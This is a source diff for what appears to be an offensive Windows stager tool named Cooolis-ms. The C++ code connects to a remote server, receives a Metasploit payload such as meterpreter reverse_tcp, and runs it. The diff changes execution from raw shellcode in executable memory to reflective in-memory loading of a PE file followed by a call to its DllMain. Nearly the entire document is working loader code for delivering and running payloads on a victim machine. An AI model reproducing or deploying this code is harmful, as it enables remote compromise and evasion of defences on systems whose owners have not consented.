@@ -11,15 +11,15 @@ Commandline e.g.>Cooolis-ms-x86.exe -p windows/meterpreter/reverse_tcp -s LHOST=
 #include <winbase.h>
 #include <tchar.h>
 #include <Ws2tcpip.h>
-
+#include "MemoryModule.h"
+#include "CLI11.hpp"
 
 #pragma comment(lib,"ws2_32.lib")
 #pragma comment(lib , "Advapi32.lib")
 
-
 using namespace std;
-
 CONST INT PAYLOAD_LEN = 200;
+typedef BOOL(*Module)(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved);
 
 #pragma pack(4)
 struct stager {
@@ -28,114 +28,65 @@ struct stager {
 };
 #pragma pack()
 
-// 输出帮助信息
-VOID Usage() {
-	cout << "[*]Usage : Cooolis-ms.exe -p [PAYLOAD] -s [PAYLOAD OPTIONS] -H [Stager Host] -P [Stager Port]" << endl;
-	cout << "\t-p [PAYLOAD] \tMSF PAYLOAD TYPE" << endl;
-	cout << "\t-s [PAYLOAD OPTIONS] \tMSF PAYLOAD OPTIONS" << endl;
-	cout << "\t-H [Stager Host] \tCooolis-Server Host" << endl;
-	cout << "\t-P [Stager Port] \tCoolis-Server Port" << endl;
-	cout << "[*]Example : Pending-Msf.exe -p windows/meterpreter/reverse_tcp -s LHOST=192.168.117.1,LPORT=1122 -H 192.168.117.1 -P 4474" << endl;
-}
 
-// 将Unicode转换为ANSI
-char* UnicodeToAnsi(const wchar_t* szStr)
+int main(int argc, char** argv)
 {
-	int nLen = WideCharToMultiByte(CP_ACP, 0, szStr, -1, NULL, 0, NULL, NULL);
-	if (nLen == 0)
-	{
-		return NULL;
+	CLI::App app{ "Cooolis-ms v1.1.1" };
+	DWORD msf_server_port = 8899;
+	std::string msf_payload = "";
+	std::string msf_options = "";
+	std::string msf_server_host = "";
+	app.add_option("-p,--payload", msf_payload, "PAYLOAD TYPE")->required();
+	app.add_option("-s,--options", msf_options, "PAYLOAD OPTIONS")->required();
+	app.add_option("-P,--PORT", msf_server_port, "Cooolis-Server Port")->check(CLI::Range(1, 65535))->required();
+	app.add_option("-H,--HOST", msf_server_host, "Cooolis-Server Host")->check(CLI::ValidIPV4)->required();
+
+	try {
+		app.parse(argc, argv);
+		if (msf_options.length() > 200 || msf_payload.length() > 200) {
+			std::cout << "PType And POptions Too long!" << std::endl;
+		}
 	}
-	char* pResult = new char[nLen];
-	WideCharToMultiByte(CP_ACP, 0, szStr, -1, pResult, nLen, NULL, NULL);
-	return pResult;
-}
-
-
-int WINAPI WinMain(  _In_  HINSTANCE hInstance,  _In_  HINSTANCE hPrevInstance,  _In_  LPSTR lpCmdLine,  _In_  int nCmdShow )
-// int main()
-{
-
-	WORD sockVersion = MAKEWORD(2, 2);
-	WSADATA wsaData;
-	// 初始化
-	if (WSAStartup(sockVersion, &wsaData) != 0)
-	{
-		cout << "[!]WSAStartup Error " << GetLastError() << endl;
-		return 0;
+	catch (const CLI::ParseError& e) {
+		std::cout << app.help() << std::endl;
+		// std::cout << e.get_exit_code() << std::endl;
+		return app.exit(e);
 	}
 
-	PWCHAR * szArgList = NULL; // 参数列表
-	int argCount = NULL; // 参数个数
-	DWORD port = NULL; // RPC 端口
-	PWCHAR ip = NULL; // RPC IP
 	// 初始化winsock
 	HANDLE hThread = NULL; // 线程句柄
 	SOCKET socks; // 套接字
 	stager sd;		// 发送数据结构体
 	DWORD dwPayloadLength = 0; // shellcode 大小
-	DWORD dwOldProtect; // 内存保护属性
 	struct sockaddr_in sock_addr; // 套接字属性
-	// 获取命令行参数及路径
+	DWORD dwThread;
+	HMEMORYMODULE hModule;
+	Module DllMain;
+	WORD sockVersion = MAKEWORD(2, 2);
+	WSADATA wsaData;
+	DWORD dwSdSizeof = sizeof(sd);
+	// 初始化
+	if (WSAStartup(sockVersion, &wsaData) != 0)
+	{
+		cout << "[!] WSAStartup Error " << GetLastError() << endl;
+		return 0;
+	}
+
 	
 	socks = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); // 创建套接字
 	ZeroMemory(sd.payload, PAYLOAD_LEN); // 清空内存
 	ZeroMemory(sd.options, PAYLOAD_LEN); // 清空内存
+	CopyMemory(sd.options, msf_options.c_str(), msf_options.length());
+	CopyMemory(sd.payload, msf_payload.c_str(), msf_payload.length());
 
-	DWORD dwSdSizeof = sizeof(sd);
-		// 如果不存在后门，则为首次运行，需要接收参数
-		// 解析参数
-		PWCHAR pstrPayload = NULL;
-		PWCHAR pstrOptions = NULL;
-		szArgList = CommandLineToArgvW(GetCommandLine(),&argCount);
-		// 如果参数小于9个，则退出
-		if (szArgList == NULL || argCount < 9)
-		{
 
-			Usage();
-			ExitProcess(0);
-		}
 
-		for (INT i = 0; i < argCount; i++)
-		{
-			if (lstrcmpW(szArgList[i], TEXT("-p")) == 0) {
-				pstrPayload = szArgList[++i];
-				
-				char* cPay = UnicodeToAnsi(pstrPayload);
-
-				CopyMemory(sd.payload, cPay, strlen(cPay));
-			}
-			else if (lstrcmpW(szArgList[i], TEXT("-s")) == 0)
-			{
-
-				pstrOptions = szArgList[++i];
-				
-				char* opt = UnicodeToAnsi(pstrOptions);
-				CopyMemory(sd.options, opt, strlen(opt));
-
-			}
-			else if (lstrcmpW(szArgList[i], TEXT("-H")) == 0)
-			{
-				ip = szArgList[++i];
-				
-			}
-			else if (lstrcmpW(szArgList[i], TEXT("-P")) == 0)
-			{
-				PWCHAR wport = szArgList[++i];
-				
-				port = _wtoi(wport);
-			}
-			else {
-				Usage();
-			}
-	}
-
-	InetPtonW(AF_INET, ip, &(sock_addr.sin_addr)); // 转换IP地址
+	InetPtonA(AF_INET, msf_server_host.c_str(), &(sock_addr.sin_addr)); // 转换IP地址
 	sock_addr.sin_family = AF_INET;		// 套接字类型
-	sock_addr.sin_port = htons(port);  // 套接字端口
+	sock_addr.sin_port = htons(msf_server_port);  // 套接字端口
 	// 连接套接字
 	while (connect(socks, (struct sockaddr*) & sock_addr, sizeof(sock_addr)) == SOCKET_ERROR) {
-		cout << "[!]Connect error ! " << GetLastError() << endl;
+		cout << "[!] Connect error ! " << GetLastError() << endl;
 		Sleep(5000);
 		continue;
 	}
@@ -149,6 +100,9 @@ int WINAPI WinMain(  _In_  HINSTANCE hInstance,  _In_  HINSTANCE hPrevInstance, 
 	// 等待三秒执行
 	Sleep(3000);
 
+
+
+
 	// 申请内存页
 	CHAR* pSpace = (CHAR*)VirtualAlloc(NULL, dwPayloadLength, MEM_COMMIT, PAGE_READWRITE);
 
@@ -157,14 +111,18 @@ int WINAPI WinMain(  _In_  HINSTANCE hInstance,  _In_  HINSTANCE hPrevInstance, 
 
 	// 关闭套接字
 	closesocket(socks);
-	// 将内存页属性更改为可执行
-	VirtualProtect(pSpace, dwPayloadLength, PAGE_EXECUTE_READ, &dwOldProtect);
-	// 创建线程，执行Shellcode
-	hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)pSpace, NULL, NULL, NULL);
-	// 等待线程执行完毕
+
+	// 导入PE文件
+	hModule = MemoryLoadLibrary(pSpace);
+	DllMain = (Module)MemoryGetProcAddress(hModule, "DllMain");
+	
+	hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)DllMain, NULL, NULL, &dwThread);
+
 	WaitForSingleObject(hThread, INFINITE);
-	// 释放内存
-	VirtualFree(hThread, 0, MEM_RELEASE);
-	return 0;
+
+	MemoryFreeLibrary(hModule);
+
+
+	return GetLastError();
 }
 
